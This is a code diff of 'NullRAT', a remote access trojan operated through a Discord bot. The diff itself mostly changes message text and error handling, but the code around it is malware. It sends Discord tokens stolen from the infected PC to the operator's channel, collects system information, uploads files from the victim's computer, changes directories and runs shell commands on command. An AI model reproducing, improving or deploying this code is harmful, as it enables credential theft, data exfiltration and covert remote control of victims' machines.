@@ -13,9 +13,9 @@ import discord, os, subprocess, re, time
 # -------------------------------------------------------------------------------------------- #
 
 # --------------------------- Required variables ----------------------------------- #
-notification_channel = 101010101010101010                       
-server_ids           = [101010101010101010, 210101010101010101] 
-bot_token            = "nullcode.ajoijad.god.jekfmskef398f2jfip0ri32ofq9ir0309imwlke"
+notification_channel = 101010101010101010 
+server_id            = [101010101010101010, 210101010101010101]
+bot_token            = "nullcode.ajoijad.god.jekfmskef398f2jfip0ri32ofq9ir0309imwlke" 
 # ---------------------------------------------------------------------------------- #
 
 
@@ -92,12 +92,6 @@ async def raw_tokens(ctx):
         return await ctx.interaction.followup.send("```" + message + "```")
     embed = Embed(title="Discord Tokens (NullRAT):", color=0x0081FA).add_field(name="RAW Tokens:", value=f"```{message.rstrip()}```")
     await ctx.interaction.followup.send(embed=embed)
-    
-    # if send_platform == "no":
-        # pass
-    # else:
-        # for tks, tks2 in zip(tokens, tokens2):            ## Broken
-            # message += f"{tks2}:\n{tks}\n"
 
 @client.slash_command(description="Sends checked tokens along with info (accurate)", guild_ids=server_ids)
 async def checked_tokens(ctx):
@@ -132,7 +126,6 @@ async def checked_tokens(ctx):
     else:
         return await ctx.interaction.channel.send(msg.replace("\n\n", ""))
     
-
 @client.slash_command(description="Sends General System Information", guild_ids=server_ids)
 async def gsl(ctx):
     await ctx.defer()
@@ -188,11 +181,13 @@ async def download(ctx, file_path):
     await ctx.defer()
     try:
         file=discord.File(file_path)
-        return await ctx.interaction.followup.send(embed = discord.Embed(title="Downloaded file from PC:", color = 0x0081FA), file=file)
+        return await ctx.interaction.followup.send(embed = Embed(title="__Downloaded file from PC:__", color = 0x0081FA), file=file)
     except FileNotFoundError:
-        await ctx.interaction.followup.send(embed=EmbedGen("CD information", "Downloading failed!", "Error: Incorrect Path"))
+        return await ctx.interaction.followup.send(embed=EmbedGen("Error while downloading!", "FileNotFoundError", "Please specify a different path and try again"))
+    except PermissionError:
+        return await ctx.interaction.followup.send(embed=EmbedGen("Error while downloading!", "PermissionError", "Please specify a different path and try again"))
         
-@client.slash_command(description="Change Directory to specified location", guild_ids=server_ids)
+@client.slash_command(description="Change directory to specified location", guild_ids=server_ids)
 async def change_directory(ctx, directory):
     try:
         os.chdir(directory)
@@ -267,7 +262,7 @@ async def shell(ctx, msg):
 @client.slash_command(description="Quits NullRAT from specified IP", guild_ids=server_ids)
 async def close(ctx, ip):
     if ip == IP():
-        await ctx.respond(embed=EmbedGen("Information", "Given IP is " + IP(), "Exiting Bot"))
+        await ctx.respond(embed=EmbedGen("Information", "Given IP is " + IP(), "Closing NullRAT..."))
         await client.close()
     if "." not in ip:
         return await ctx.respond(embed=EmbedGen("Information", "Given IP is incorrect!", "Please try again"))  
